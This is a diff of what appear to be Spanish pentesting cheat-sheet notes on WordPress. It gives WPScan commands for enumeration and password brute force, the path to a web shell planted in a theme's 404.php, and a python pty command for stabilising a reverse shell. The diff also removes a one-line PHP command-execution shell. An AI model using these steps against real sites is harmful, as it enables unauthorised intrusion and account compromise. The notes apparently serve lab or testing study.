@@ -19,16 +19,18 @@ O la lista de usuarios en un json:
 
 
 
-######################################WPSCAN
+### WPSCAN
 
-wpscan -url "" --enumerate  --api-token <api-token>
-wpscan -url "" --usernames "" --passwords "dictio"
+#### Enumerar todo el sitio y plugins:
+        wpscan -url "" --enumerate  --api-token <api-token>
+#### BF:
+        wpscan -url "" --usernames "" --passwords "dictio"
 
 pasar comando para insertar código como parametro:
-system($_GET['cmd']);
 
-acceder a la pagina php con la shell
-http://"ip o url"/wp-content/themes/"tema"/404.php
+
+####Acceder a la pagina php con la shell
+        http://"ip o url"/wp-content/themes/"tema"/404.php
 
 si la reverse shell es la monkey, para migrar a una shell más estable:
-python -c 'import pty;pty.spawn("/bin/bash")' 
+        python -c 'import pty;pty.spawn("/bin/bash")' 
